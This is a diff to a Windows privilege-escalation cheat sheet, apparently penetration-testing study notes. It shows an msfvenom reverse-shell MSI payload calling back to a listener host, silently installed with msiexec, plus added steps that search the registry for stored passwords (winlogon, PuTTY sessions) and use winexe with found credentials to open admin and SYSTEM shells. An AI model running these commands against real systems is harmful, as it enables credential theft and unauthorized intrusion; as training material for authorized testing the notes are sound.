@@ -228,8 +228,31 @@ msfvenom -p -windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f msi -
 6. setup netcat and Run the msi
 ```
 msiexec /quiet /qn /i reverse.msi
-
 ```
+## Passwords
+### Logged On Account Password
+1. winpeas will usually parse out the password if there are any.
+2. Can manually check but usually will have too many results and is better if you know which location to look for.
+```
+reg query HKLM /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s
+
+# example of winlogin directory check
+reg query "HKLM\Software\Mircosoft\Windows NT\CurrentVersion\winlogon"
+
+# example of putty session query
+reg query "HKCU\Software\<user>\PuTTY\Sessions" /s
+```
+3. Can use ```winexe``` to spawn a shell
+```
+winexe -U 'admin%password123' //<ip> cmd.exe
+```
+4. We can further elevate the access once you are in admin and to get ```SYSTEM```
+```
+winexe -U 'admin%password123' --system //<ip> cmd.exe
+```
+
+### Saved Credential
 
 ## Kernel Exploit (Last resort)
 ### Tools
